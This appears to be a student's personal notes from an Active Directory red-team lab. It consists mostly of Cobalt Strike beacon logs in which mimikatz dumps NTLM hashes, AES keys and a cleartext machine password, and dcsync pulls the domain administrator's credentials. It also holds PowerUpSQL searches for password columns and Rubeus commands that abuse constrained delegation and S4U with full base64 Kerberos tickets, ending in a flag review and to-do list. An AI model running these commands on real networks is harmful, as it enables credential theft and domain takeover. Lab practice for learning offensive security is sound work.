	 * Password : H@fWIk<B]U(:E->:]aBJK':CMcT-FVoWu/!oZ^q14fIM_foA*TRNP:]U'7W@BcGfZyX;.ZeippR>b_S=X#icO5&^yhRT%J$g08Hz'8`*:'$P;Hf3nMj)FhZi
	ssp :	
	credman :	
	cloudap :	

Authentication Id : 0 ; 45867 (00000000:0000b32b)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 4/25/2025 6:56:19 AM
SID               : S-1-5-90-0-1
	msv :	
	 [00000003] Primary
	 * Username : DB$
	 * Domain   : KATO
	 * NTLM     : fe64feaea0b3665b88dd9e5137604726
	 * SHA1     : 283b24a26e6d00142f504323b12e5a84cd9cb1d5
	tspkg :	
	wdigest :	
	 * Username : DB$
	 * Domain   : KATO
	 * Password : (null)
	kerberos :	
	 * Username : DB$
	 * Domain   : kato.org
	 * Password : H@fWIk<B]U(:E->:]aBJK':CMcT-FVoWu/!oZ^q14fIM_foA*TRNP:]U'7W@BcGfZyX;.ZeippR>b_S=X#icO5&^yhRT%J$g08Hz'8`*:'$P;Hf3nMj)FhZi
	ssp :	
	credman :	
	cloudap :	

Authentication Id : 0 ; 997 (00000000:000003e5)
Session           : Service from 0
User Name         : LOCAL SERVICE
Domain            : NT AUTHORITY
Logon Server      : (null)
Logon Time        : 4/25/2025 6:56:19 AM
SID               : S-1-5-19
	msv :	
	tspkg :	
	wdigest :	
	 * Username : (null)
	 * Domain   : (null)
	 * Password : (null)
	kerberos :	
	 * Username : (null)
	 * Domain   : (null)
	 * Password : (null)
	ssp :	
	credman :	
	cloudap :	

Authentication Id : 0 ; 24921 (00000000:00006159)
Session           : Interactive from 0
User Name         : UMFD-0
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 4/25/2025 6:56:18 AM
SID               : S-1-5-96-0-0
	msv :	
	 [00000003] Primary
	 * Username : DB$
	 * Domain   : KATO
	 * NTLM     : fe64feaea0b3665b88dd9e5137604726
	 * SHA1     : 283b24a26e6d00142f504323b12e5a84cd9cb1d5
	tspkg :	
	wdigest :	
	 * Username : DB$
	 * Domain   : KATO
	 * Password : (null)
	kerberos :	
	 * Username : DB$
	 * Domain   : kato.org
	 * Password : H@fWIk<B]U(:E->:]aBJK':CMcT-FVoWu/!oZ^q14fIM_foA*TRNP:]U'7W@BcGfZyX;.ZeippR>b_S=X#icO5&^yhRT%J$g08Hz'8`*:'$P;Hf3nMj)FhZi
	ssp :	
	credman :	
	cloudap :	

Authentication Id : 0 ; 24863 (00000000:0000611f)
Session           : Interactive from 1
User Name         : UMFD-1
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 4/25/2025 6:56:18 AM
SID               : S-1-5-96-0-1
	msv :	
	 [00000003] Primary
	 * Username : DB$
	 * Domain   : KATO
	 * NTLM     : fe64feaea0b3665b88dd9e5137604726
	 * SHA1     : 283b24a26e6d00142f504323b12e5a84cd9cb1d5
	tspkg :	
	wdigest :	
	 * Username : DB$
	 * Domain   : KATO
	 * Password : (null)
	kerberos :	
	 * Username : DB$
	 * Domain   : kato.org
	 * Password : H@fWIk<B]U(:E->:]aBJK':CMcT-FVoWu/!oZ^q14fIM_foA*TRNP:]U'7W@BcGfZyX;.ZeippR>b_S=X#icO5&^yhRT%J$g08Hz'8`*:'$P;Hf3nMj)FhZi
	ssp :	
	credman :	
	cloudap :	

Authentication Id : 0 ; 23708 (00000000:00005c9c)
Session           : UndefinedLogonType from 0
User Name         : (null)
Domain            : (null)
Logon Server      : (null)
Logon Time        : 4/25/2025 6:56:18 AM
SID               : 
	msv :	
	 [00000003] Primary
	 * Username : DB$
	 * Domain   : KATO
	 * NTLM     : fe64feaea0b3665b88dd9e5137604726
	 * SHA1     : 283b24a26e6d00142f504323b12e5a84cd9cb1d5
	tspkg :	
	wdigest :	
	kerberos :	
	ssp :	
	credman :	
	cloudap :	

Authentication Id : 0 ; 999 (00000000:000003e7)
Session           : UndefinedLogonType from 0
User Name         : DB$
Domain            : KATO
Logon Server      : (null)
Logon Time        : 4/25/2025 6:56:18 AM
SID               : S-1-5-18
	msv :	
	tspkg :	
	wdigest :	
	 * Username : DB$
	 * Domain   : KATO
	 * Password : (null)
	kerberos :	
	 * Username : db$
	 * Domain   : KATO.ORG
	 * Password : (null)
	ssp :	
	credman :	
	cloudap :	

```



```python
powerpick Get-SQLInstanceDomain | Get-SQLConnectionTest | ? { $_.Status -eq "Accessible" } | Get-SQLColumnSampleDataThreaded -Keywords "username,password" -SampleSize 5 | select instance, database, column, sample | ft -autosize
```



```python
[04/25 14:51:54] beacon> mimikatz !lsadump::sam
[04/25 14:51:56] [*] Tasked beacon to run mimikatz's !lsadump::sam command
[04/25 14:51:56] [+] host called home, sent: 815424 bytes
[04/25 14:51:58] [+] received output:
Domain : DB
SysKey : 68113a7ff8521fbf87f0f97939139bf7
Local SID : S-1-5-21-2225976566-2457290929-1130185472

SAMKey : b3d9d9794ef312d33c803b153b202a91

RID  : 000001f4 (500)
User : Administrator
  Hash NTLM: 7ff60bf36da35d9f3ccb9c0206095408

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : e0976792393a610c30627edea09b77ac

* Primary:Kerberos-Newer-Keys *
    Default Salt : EC2AMAZ-E53067SAdministrator
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : c65d0e4b0a6f3eecdf0e93012216426fb1482802364037f4f639051a04b27d1c
      aes128_hmac       (4096) : 3663c68a4e68cc2650a032b07ed03a3b
      des_cbc_md5       (4096) : 2ffe261ccdea52cd
    OldCredentials
      aes256_hmac       (4096) : 2926d54d14ea912977fd6807d08dba7153cf0aa9584dc640c92e988bcc3c5c08
      aes128_hmac       (4096) : a45d1c0dcf46d84ce78778625363dff2
      des_cbc_md5       (4096) : b0293b574ad9c8c8
    OlderCredentials
      aes256_hmac       (4096) : 9ba815b1bb7843f7815b604a3fe32a2752ea5afa6af0c3d087e88af96dbabe3e
      aes128_hmac       (4096) : eae384a9b988d92faa584e6df791119a
      des_cbc_md5       (4096) : fef1fdbf32343e75

* Packages *
    NTLM-Strong-NTOWF

* Primary:Kerberos *
    Default Salt : EC2AMAZ-E53067SAdministrator
    Credentials
      des_cbc_md5       : 2ffe261ccdea52cd
    OldCredentials
      des_cbc_md5       : b0293b574ad9c8c8


RID  : 000001f5 (501)
User : Guest

RID  : 000001f7 (503)
User : DefaultAccount

RID  : 000001f8 (504)
User : WDAGUtilityAccount
  Hash NTLM: d7da45674bae3a0476c0f64b67121f7d

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : be9923d30a0cdf3a73493d7d32eb96e4

* Primary:Kerberos-Newer-Keys *
    Default Salt : WDAGUtilityAccount
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : c5a174bdaaf42f78aea168d2bb0736459de5ad0b5051997187d8b86f7af8ee69
      aes128_hmac       (4096) : 17456060abe8c50bc7ec5474e44d0ae4
      des_cbc_md5       (4096) : 5e435ecec4efbfdc

* Packages *
    NTLM-Strong-NTOWF

* Primary:Kerberos *
    Default Salt : WDAGUtilityAccount
    Credentials
      des_cbc_md5       : 5e435ecec4efbfdc

```





```
[04/25 14:52:43] beacon> mimikatz !lsadump::cache
[04/25 14:52:45] [*] Tasked beacon to run mimikatz's !lsadump::cache command
[04/25 14:52:45] [+] host called home, sent: 815426 bytes
[04/25 14:52:47] [+] received output:
Domain : DB
SysKey : 68113a7ff8521fbf87f0f97939139bf7

Local name : DB ( S-1-5-21-2225976566-2457290929-1130185472 )
Domain name : KATO ( S-1-5-21-2708793558-3453453652-160833008 )
Domain FQDN : kato.org

Policy subsystem is : 1.18
LSA Key(s) : 1, default {844911df-68f8-ab46-3225-69810a465ad7}
  [00] {844911df-68f8-ab46-3225-69810a465ad7} feb6b002d2621c31f358d9266d8764ef2dc643e5843946c4a68d57423adb4460

* Iteration is set to default (10240)

```



constrianed deleg found


```python
[04/25 14:58:38] beacon> execute-assembly C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe --search "(&(objectCategory=computer)(msds-allowedtodelegateto=*))" --attributes dnshostname,samaccountname,msds-allowedtodelegateto --json
[04/25 14:58:41] [*] Tasked beacon to run .NET program: ADSearch.exe --search "(&(objectCategory=computer)(msds-allowedtodelegateto=*))" --attributes dnshostname,samaccountname,msds-allowedtodelegateto --json
[04/25 14:58:41] [+] host called home, sent: 486418 bytes
[04/25 14:58:42] [+] received output:

    ___    ____  _____                 __  
   /   |  / __ \/ ___/___  ____ ______/ /_ 
  / /| | / / / /\__ \/ _ \/ __ `/ ___/ __ \
 / ___ |/ /_/ /___/ /  __/ /_/ / /__/ / / /
/_/  |_/_____//____/\___/\__,_/\___/_/ /_/ 
                                           
Twitter: @tomcarver_
GitHub: @tomcarver16
            
[*] No domain supplied. This PC's domain will be used instead
[*] LDAP://DC=kato,DC=org
[*] CUSTOM SEARCH: 
[*] TOTAL NUMBER OF SEARCH RESULTS: 1
[
  {
    "dnshostname": "db.kato.org",
    "samaccountname": "DB$",
    "msds-allowedtodelegateto": [
      "time/ad.kato.org/kato.org",
      "time/ad.kato.org",
      "time/AD",
      "time/ad.kato.org/KATO",
      "time/AD/KATO"
    ]
  }
]

```



```
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe dump /luid:0x3e4 /service:krbtgt /nowrap
```


```
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:DB$ /ntlm:fe64feaea0b3665b88dd9e5137604726 /nowrap
```


```
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /impersonateuser:nlamb /msdsspn:cifs/dc-2.dev.cyberbotic.io /user:sql-2$ /ticket: /nowrap


execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /impersonateuser:Administrator /msdsspn:cifs/ad.kato.org /user:DB$ /ticket: /nowrap
```



```python
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /impersonateuser:administrator /msdsspn:TIME/ad.kato.org /altservice:cifs /user:DB$ /ticket: /nowrap
```


```python
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /impersonateuser:administrator /msdsspn:TIME/ad.kato.org /altservice:cifs /user:DB$ /ticket:doIFADCCBPygAwIBBaEDAgEWooIEJjCCBCJhggQeMIIEGqADAgEFoQobCEtBVE8uT1JHoh0wG6ADAgECoRQwEhsGa3JidGd0GwhrYXRvLm9yZ6OCA+YwggPioAMCARKhAwIBAqKCA9QEggPQdZJRhqcSf6epeA15ur7KdUK3z76jXjxwOc9PtMKqY/Ed61Hh+XDz0pV+ZY0TZwYypPcMRgUuhxOcKW5dxARdgnAp+GvIQVR9jDVFRRQZUdSVo2MxCnD2K9pUeICA1zp9Nbtg+IH+XfD/M2YG9/qW+kZx5+VsRFZmr7AlkOLP/e9PAZb7dr3TGj70LKlB+vuyghR+K04U/49MbNg77lCEXTI5DwqTbFgHGY8T18DZosyh3heMqhUltrtXobjxRHNCgWcImq7qEpaBa58wLngQmDsn+f/0mKdNxCAJK1ocBte1Y1mXKSMq+HUz67f8di76DzjVRS8sLvWqby+FvHyLitvKeYS64nk5W+KoaizVT7b5MrnOgJ0s2KRsobENt8jUAsmtxJGEr0AeBgQennYBb0T50ZxLx1/xxVX1zf69wR6N+pa3kFfZFJBJe1w56CefiwTxY9y3tPrdNUksdRKpO9Me5Nk4vZuz6qVc1w/GEz6bTUW8nl4MFbjNuRyvPHhOTSM8pU2dQ+ilshNaxrh2TfM5ol1K9rJwa81PCuhIFAgJ+VzrKiJBVEJFLIeS6QxGY/naXRtY3G3YDQJRpJ4B+g0RnAeiT46xlidP0HWTo81u/oOO6uDEj9CUM+u/DNqrIV9zpsVwo+TioaVTwzlSjuikGIWO7BQAKZL8VWpMKQJkoDBN55Jc++4X/G02ua9WsNkRSHmpxCA8ljSoS8rt/cVT6EIoU9EOI6r0uDuinV0sDSe2A9Xo+vHbW4yfux6jakknh6ROhfTa5l21ltp6xKoUm+hgyTwE+rlxnhy9DLKwVF4MbGu3fGLRXUTMm/CaaNRFLPce3LIz4vYkPoiKE7uaX2ZC/4odWpHGaxUXB5Lc2w0XD9ebxcKJzcYwSRsw6OG/TFrgXO0jHpJsMPCLIY1auKFKuiEwM9UPOSuMi0TJgWztekAf5FoWqhyk/kKe1L60Km3MF3TLPFNuF6GjVJsY0Eeoys5JQURoU+mPCku5rcyQi3iRtabzr7S/hrHPwIguQI525SnsUWNtJVbOgGo3t9Wl9eK4lTdv2nkqQ6QBE1vl6IcQoz/5paxPbuNrMmpnnJ8MqnQDLfL6n9p7hPcm5nBsX4rrNUDlbJlwpclecDfrdjgRpbYy7D0Vofk+Tv2kWzxYxQsyVuXD/CPvlnspGwhByj6S/tVXN/dvxxJZzkoquzALNXONc9br0AE25LA76wet144q6bAAu10ldn1LbFxyOzpX6avKh/w4KG4aXq4v0KIfQ81Q8Dki4/1ju6oGM46jGx9lTsEQ7AC+gqOBxTCBwqADAgEAooG6BIG3fYG0MIGxoIGuMIGrMIGooBswGaADAgEXoRIEEHInFDaV7oD4pS2CXwdbMiWhChsIS0FUTy5PUkeiEDAOoAMCAQGhBzAFGwNEQiSjBwMFAEDhAAClERgPMjAyNTA0MjUxNDM1MTlaphEYDzIwMjUwNDI2MDAzNTE5WqcRGA8yMDI1MDUwMjE0MzUxOVqoChsIS0FUTy5PUkepHTAboAMCAQKhFDASGwZrcmJ0Z3QbCGthdG8ub3Jn  /nowrap /ptt
```


```
ls \\ad.kato.org\C$
```



```
sc.exe \\myserver create NewService binpath= c:\windows\system32\NewServ.exe
```


---




## TO DO LIST

In order of priority

- Create ticket with HOST for WMI
	- try to get WMI execution
- try using silver / golden ticket
- create service on DC to execute SMB beacon
- try use cd .. so you could psexec


## Mistakes

- didnt finish course material
- be patient and reboot
- use your eyes
- when in doubt take a break or get a snack **mandatory**
- use what you learnt.
- try to rememebr what you already know and do your best to mix and match


## REVIEW 



- flag 1 was WPE with misconfigured binpath
- flag 2 was the WEB host. where a simple psexec was enough
- flag 3 was unconstrained delegation from WEB to DC, got stuck here
	- I guess just reset the lab and wait
- flag 4 was literally just the jump box
	- using lmonk to get here which was the foreign user
- flag 5 was the DB, I needed to focus up and read the actual content material which would have made my life actual a whole lot fucking easier if I had focused
- flag 6 
	- just getting the flag using the cifs ticket


- review and understand how port forwards work
- 


---

##  Alternative trash here ignore


administrator TGT

```
doIFXjCCBVqgAwIBBaEDAgEWooIEfTCCBHlhggR1MIIEcaADAgEFoQsbCUFDTUUuQ09SUKIeMBygAwIBAqEVMBMbBmtyYnRndBsJYWNtZS5jb3Jwo4IEOzCCBDegAwIBEqEDAgECooIEKQSCBCUokYXmnj5rsYov8il6mhhCQZ9AXVb6BzHa7Epbce+ma/+PdpKP8ObXTBOa4pLNb9frY0mSXTd0FUci2kqbFO+7lrKPUOhdo6Jp/BfFJ4xWepTw6ZKF52etn6OW6gd26tp7gju27PyCD7UyO84Yx6pl95p9uyLhl9DGJDtx1i60aOUzwN386g/5+7GGwjcTmdggcxVONsJOeUQvy5HgZXIiXuD9VH5CFitriFhzN6fxN7488Yc5W97BLjnMKlhrh7UY3E3Nd/HVNaIOrtfRIa6Y9oye5ZjWxC0xtfZQKPzZILjRUdS5/BwL4nXXhsDVIpahn23vsOh4YUsYm4ElWtXVMPcoRTJU728vIcWYVh7O4M5B3ViVVxzyuHlZzTdOb+OVIKh5qiDe+/DSKyOfCG2eJEw6to8tFYmcsy1Z8KDLCrIy5Ih5gUtq4Iui4A3eIC6HWLyw8/dMXYYUEEZnO3nrnd2duILOECykRq97+5Ez1IEHlPzVhIJ34u7A8egCpZ9etVSYeksEQimmYRfW5wFLm1OXC5YvXjcQHw27MsxVRW5IyBBYoa6Ug1xRb/zl1vGeIslI6044Iosu2jO9f/VpmmU2+pp50stNVdBNtNsegGE3nYGLbi1yuigkhkKyxaZp7e+t8SX18GuAAW1vp9vwVj9t71U3Tc3ffC2557cTY6UNTF8WwHzdaFBOZ31zvffc7Y0Y71Udmed2RCyGyTmLX/7rt8X8TruxlaUb4P/269mFW4CS8EAV5i0hJqi7Dy+vlrrH/mczhMAiHWRGMf0Cmc1uBEFogXQsXf1/Shos3/V8Z8144KmTnHOJOeRqGI38rlb5st2c8B8BGH/HIFgvxlqGgLzGEYpsxL2FdMjwwC6z/Q7pc2Z6yU5b+i9MvAIQmsyChi7TOziEUB+fB3IHIC0QgpMXyfqlDUQTvkKCPoxBmjbPG+8glsRGCCfX6wv06YwK4lN5wj+lCiiaz/ah2uA90Ex4lCufZiEE5CfUGelTjk0ZMkTSnrXLF/HM72l4Wm1AFeEPB+gg3fyMNE7P21f2GL1rqSYMjfLbJEM4PH3IeUJDEf8FCT39m534Lc6p5xanzyWoxk/eEVjtDnlkmGu2LGBJkSK6jjg8yGuEbBqUkbw7OQbFUos3MWVhhT3EpHZCgW31vd32fjo0BI53IaJjDm/wEde/8i+/kuuxvY3cmYj6Rc/YRd0/5krunHJd3VqiHwnPtjMkLeH/jeGtBAxwPk1yUrFeL51I/iXvrld/O+jevNVao9sOE6AwxJ9PypxBsxYvMOo6X9DdcsY8kPTXi3La3kZixAQ29bAzKaKtjHC2Zq23IPMETxr9e+fmd26F/5Kgb++wNzeN9V12yeYFrcoLwb0B+M2GdXtV0x6GmRjany1NAMdwo5QR/VoEs4S3v6OBzDCByaADAgEAooHBBIG+fYG7MIG4oIG1MIGyMIGvoBswGaADAgEXoRIEEDsgG+BeigCytOt3jLlsbmehCxsJQUNNRS5DT1JQohQwEqADAgEBoQswCRsHcGNvdHRvbqMHAwUAQOEAAKURGA8yMDI1MDQyMzE2NDg1MVqmERgPMjAyNTA0MjQwMjQ4NTFapxEYDzIwMjUwNDMwMTY0ODUxWqgLGwlBQ01FLkNPUlCpHjAcoAMCAQKhFTATGwZrcmJ0Z3QbCWFjbWUuY29ycA==
```


### Administrator hash

```
[04/23 19:10:05] beacon> mimikatz @lsadump::dcsync /user:administrator /domain:acme.corp
[04/23 19:10:07] [*] Tasked beacon to run mimikatz's @lsadump::dcsync /user:administrator /domain:acme.corp command
[04/23 19:10:07] [+] host called home, sent: 815439 bytes
[04/23 19:10:09] [+] received output:
[DC] 'acme.corp' will be the domain
[DC] 'dc.acme.corp' will be the DC server
[DC] 'administrator' will be the user account
[rpc] Service  : ldap
[rpc] AuthnSvc : GSS_NEGOTIATE (9)

Object RDN           : Administrator

** SAM ACCOUNT **

SAM Username         : Administrator
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Account expiration   : 1/1/1601 1:00:00 AM
Password last change : 10/6/2022 11:16:24 AM
Object Security ID   : S-1-5-21-951568539-2129440919-2691824384-500
Object Relative ID   : 500

Credentials:
  Hash NTLM: 28aef4d9982c20c1c535472c5972389b

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : dd1979c9f1c83e099dbfbb621bd3bb05

* Primary:Kerberos-Newer-Keys *
    Default Salt : EC2AMAZ-HHBFSTJAdministrator
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : 1f09492242778e62b4777e6259356793d221fc682ed91cdc1b44dd2bd8a7cce6
      aes128_hmac       (4096) : 5155b2038d1eb9fdfbe1ec7cf7e03fc9
      des_cbc_md5       (4096) : d032adbc0dec0d5d
    OldCredentials
      aes256_hmac       (4096) : eecddb2024d7efffe9f9cb5932668d9a4fa05a3989e3f404e48f21fd8191e314
      aes128_hmac       (4096) : 1d087a47e6dcb470c4983f023c883cd6
      des_cbc_md5       (4096) : 45cd7af7027cbf1a
    OlderCredentials
      aes256_hmac       (4096) : bbe0141ccdf9a0d222d9f17038c9fb352e6be5140cb74137ebfd4b2d5a8c46a
      aes128_hmac       (4096) : 37082f479bc9f56bf5f5c3185d6fb166
      des_cbc_md5       (4096) : 616179ae0829b3b5

* Packages *
    NTLM-Strong-NTOWF

* Primary:Kerberos *
    Default Salt : EC2AMAZ-HHBFSTJAdministrator
    Credentials
      des_cbc_md5       : d032adbc0dec0d5d
    OldCredentials
      des_cbc_md5       : 45cd7af7027cbf1a

```


```plain
kiwi_cmd "lsadump::dcsync /user:[domain\\\\username] /domain:[domain]"
```


## DC TGT

```
      doIFLjCCBSqgAwIBBaEDAgEWooIEUTCCBE1hggRJMIIERaADAgEFoQsbCUFDTUUuQ09SUKIeMBygAwIBAqEVMBMbBmtyYnRndBsJYWNtZS5jb3Jwo4IEDzCCBAugAwIBEqEDAgECooID/QSCA/nNiwOTWBKOMA1+1zVVIh8P6Qou8dZnVvLLrgxr3Kaw5hKKAhOa0anyKKd/VmI8l+ngU0e7BId6Gr0bjd9kfk/cA29uq1urTevdrUqfh1UDwmLUONPkJCjnLjbFWIy9grAqOWO208S0VZayCIRF4270com4rzpdNM5/7Mm94JrD27g68vpi17IBQdfY8dZgwfEZscbPNmyuLBIi3QgZmCV/u8hE9mZg42i4m2fM+Y7knotWVNeLrkda9NLD1BRb5cutvzna1v/I5yQf8fOEYzEWfZSMJUi74IYAR0SUpmkHCx51LFAJ5mCYwf7AXLYZa73xHBB2KbLToAf6QPjgOQx5GKuGDQWSUJCIzwtH3MhvCOQqBTuU6f5hwSY9shW4sUzxkpGhhaV0ggiacyHVCLD1zieMpQnj9DDNsGtYNkmTZLhhaX+vR2IC6xFU49Oiomv7a02uGnvVY2423S+nk4sOryAT+7IgD9kTtPId4dHSMrNelfOIwvL2Vre0tT22XEtmWlOUaraRZoHcSOsY3k8jo40gxKxAwCYBm9DfWf49R8O3nv2MR6UCz14fs+wcVD5TEsUaJgh1fzqzU4EvfrIQ64rgdsRguYCA8Nkciml9R1mR9dhadGNcDlg3soBk+6P17weExq0mKOMPvAHryiKgxQqae3uUgEgrU12Pld9xU3A/aZkHMvfugCWiR0quez/ro0rmvdCvW7tL+tGf3ktFRiq1weZJ1n4NoFx5HRrMQPscBGFnhRGvjQHYYlUKNrJ/Xblcsvtz2C4eOiDWEtx6I5JzTlUzxfKEVTwUhDl837Ha5DiXqtne1m0NYm7HirVbBtt6O+ybcJuTn6kYRL/6xd5FQtONvX7QznUPHqtKshG9DFU026zGpHPjbd/7jAPGmmG2ar4OowTEIxx3AGiLM4hCRKvNx7ldSgbd8jTO2ihPUS06TqqIux7ixzzh7yiWFMjA4UOat2jD/dbojfMBl998m5LhR5H9YSP5TSbO5I5hF40l3geAzq6ox5XqYwEz+kpo5obtEDmSJXKZMyeTPcxzNzbLt4TblCs9uoy55TEx/EQk5O2N1Fm65Qcx/adLACeYrJ32IqfiGtM8MlROvGCjMKUeeWFYUSnLjRKmGROija3k/jhWcDx9l9XvuKIXOG/Lgr+2p3B7c+a2GPPmPAItVWJAgqO0/lnL10TXhFeBVsa6iJT8ZP0z+Mz9qiN2tTa2eBuoS/o4X0KUAVxTFEBdUl7uj93oCtzPq+9BHn4uN3uHCAgCkxhev7kVculBMrCOGVwNRuuAGASG3uKedV4+8KW+sYCDofGx9t6F5HnCm0xZzyvJT+rxLC3ihKRMTCLZ/c0Gh3CjgcgwgcWgAwIBAKKBvQSBun2BtzCBtKCBsTCBrjCBq6AbMBmgAwIBF6ESBBAiUCqLxKhEMQ2YOTQkMcy7oQsbCUFDTUUuQ09SUKIQMA6gAwIBAaEHMAUbA0RDJKMHAwUAQOEAAKURGA8yMDI1MDQyNDA4NDI1NVqmERgPMjAyNTA0MjQxODQyNTVapxEYDzIwMjUwNTAxMDg0MjU1WqgLGwlBQ01FLkNPUlCpHjAcoAMCAQKhFTATGwZrcmJ0Z3QbCWFjbWUuY29ycA==

```

s4u2self abuse

```
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /impersonateuser:Administrator /self /altservice:cifs/dc.acme.corp /user:DC$ /ticket:doIFLjCCBSqgAwIBBaEDAgEWooIEUTCCBE1hggRJMIIERaADAgEFoQsbCUFDTUUuQ09SUKIeMBygAwIBAqEVMBMbBmtyYnRndBsJYWNtZS5jb3Jwo4IEDzCCBAugAwIBEqEDAgECooID/QSCA/nNiwOTWBKOMA1+1zVVIh8P6Qou8dZnVvLLrgxr3Kaw5hKKAhOa0anyKKd/VmI8l+ngU0e7BId6Gr0bjd9kfk/cA29uq1urTevdrUqfh1UDwmLUONPkJCjnLjbFWIy9grAqOWO208S0VZayCIRF4270com4rzpdNM5/7Mm94JrD27g68vpi17IBQdfY8dZgwfEZscbPNmyuLBIi3QgZmCV/u8hE9mZg42i4m2fM+Y7knotWVNeLrkda9NLD1BRb5cutvzna1v/I5yQf8fOEYzEWfZSMJUi74IYAR0SUpmkHCx51LFAJ5mCYwf7AXLYZa73xHBB2KbLToAf6QPjgOQx5GKuGDQWSUJCIzwtH3MhvCOQqBTuU6f5hwSY9shW4sUzxkpGhhaV0ggiacyHVCLD1zieMpQnj9DDNsGtYNkmTZLhhaX+vR2IC6xFU49Oiomv7a02uGnvVY2423S+nk4sOryAT+7IgD9kTtPId4dHSMrNelfOIwvL2Vre0tT22XEtmWlOUaraRZoHcSOsY3k8jo40gxKxAwCYBm9DfWf49R8O3nv2MR6UCz14fs+wcVD5TEsUaJgh1fzqzU4EvfrIQ64rgdsRguYCA8Nkciml9R1mR9dhadGNcDlg3soBk+6P17weExq0mKOMPvAHryiKgxQqae3uUgEgrU12Pld9xU3A/aZkHMvfugCWiR0quez/ro0rmvdCvW7tL+tGf3ktFRiq1weZJ1n4NoFx5HRrMQPscBGFnhRGvjQHYYlUKNrJ/Xblcsvtz2C4eOiDWEtx6I5JzTlUzxfKEVTwUhDl837Ha5DiXqtne1m0NYm7HirVbBtt6O+ybcJuTn6kYRL/6xd5FQtONvX7QznUPHqtKshG9DFU026zGpHPjbd/7jAPGmmG2ar4OowTEIxx3AGiLM4hCRKvNx7ldSgbd8jTO2ihPUS06TqqIux7ixzzh7yiWFMjA4UOat2jD/dbojfMBl998m5LhR5H9YSP5TSbO5I5hF40l3geAzq6ox5XqYwEz+kpo5obtEDmSJXKZMyeTPcxzNzbLt4TblCs9uoy55TEx/EQk5O2N1Fm65Qcx/adLACeYrJ32IqfiGtM8MlROvGCjMKUeeWFYUSnLjRKmGROija3k/jhWcDx9l9XvuKIXOG/Lgr+2p3B7c+a2GPPmPAItVWJAgqO0/lnL10TXhFeBVsa6iJT8ZP0z+Mz9qiN2tTa2eBuoS/o4X0KUAVxTFEBdUl7uj93oCtzPq+9BHn4uN3uHCAgCkxhev7kVculBMrCOGVwNRuuAGASG3uKedV4+8KW+sYCDofGx9t6F5HnCm0xZzyvJT+rxLC3ihKRMTCLZ/c0Gh3CjgcgwgcWgAwIBAKKBvQSBun2BtzCBtKCBsTCBrjCBq6AbMBmgAwIBF6ESBBAiUCqLxKhEMQ2YOTQkMcy7oQsbCUFDTUUuQ09SUKIQMA6gAwIBAaEHMAUbA0RDJKMHAwUAQOEAAKURGA8yMDI1MDQyNDA4NDI1NVqmERgPMjAyNTA0MjQxODQyNTVapxEYDzIwMjUwNTAxMDg0MjU1WqgLGwlBQ01FLkNPUlCpHjAcoAMCAQKhFTATGwZrcmJ0Z3QbCWFjbWUuY29ycA== /nowrap
```


```
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:acme.corp /username:administrator /password:FakePass /ticket:doIFvDCCBbigAwIBBaEDAgEWooIExDCCBMBhggS8MIIEuKADAgEFoQsbCUFDTUUuQ09SUKIfMB2gAwIBAaEWMBQbBGhvc3QbDGRjLmFjbWUuY29ycKOCBIEwggR9oAMCARKhAwIBA6KCBG8EggRrEY14xYqpMM0ZZbPal3ZiHYdw8d4JV9AGP04kVPQ6AGKCsEHNRtvIpMXsQ8jOVfa3TWR8l66w0frrCHRZPJJSsqHkPp1b1hivhxOsFseT191f19qOLkdkeTQFay5GbBJMZID7fuYD5TEsbPSfzaA/ouG/tw2+uCYvAY4pB1gepAyUpj024OyDbh2NjH6Ejb7frfJZsw8FbORDu2VMEzmnO4xpuTR3PyZW5NZM8OZSNKG40ABr1hNwb+t3tiHyBZ4JYb7FgLsi7dcNJmK7UaBu9pvHnaegd9WbvCJq9E03Dh9hLmjsHM2E5vqjjGRMo5/YqCAbTmOuG9onvNhX9Lr22OZTDf/ylyEOF7dveT7hYy92QBTTMpJeIy9kEZVBtZil/44VOMviWoANCHMxoyw+A6oVKRPrzOVDRxZLsS9M2YjUeJ2NmvBZeXczyZ/367Uy4zxmYnp2BRL99vHnXM08+fKPrvBnbhi+xiMIIC39SsPX4HOj0G00pKzFFN1tlcSvbfJQJKAX4wCkLVfVWUoSlB2p+2qrr19/MVbrweIOklR1yYEd8SpcJtqmYvK2CxhggpHkH3aj8hthBxM2JbMXv/vy+OZiCGwDVAv/D60Cb8tq+aDNfo5J/Y0YRBffeNMrEtMzPc+eIfji+1zcRASRyN7z2QZf6VHto3U+/B6juffhBacERh4Fwfrlp2toiklGwwtjHZiAYYP6CSnRPZu1W6xOjKk/ReRdYfMQOXEBcY6m2OkHbj+en37ybd45viiinMru3ZhdX/3Wcb+ursBofQBcr9jRIkZFGbEvC816up/5XaLhSBl5USUlrGSZdiuK7BCh1ZWnS8Ry2nwZz6sgfFjgI/NL2kHDeGTNHp5c3kEWrsZ/z7HntsibTMmTIQn7Nw2SAcV2azrdfVwEV6jxf1ioYaL8z0wWH47oiqMd/zgQeUBVLcjkk3DlPPlKIr0F1A9HpiMKo6xJffYM495qSGaV4ZAzjxMXcvmZhdFNi9g3Kf+BdhhtEbDIiasP8A8tnr1V8YjkotSObIB+4E1XTXVVIxIWdDUWaqby3M44MnYFW1ORbEYC8EBuFF1HojeKWHw4N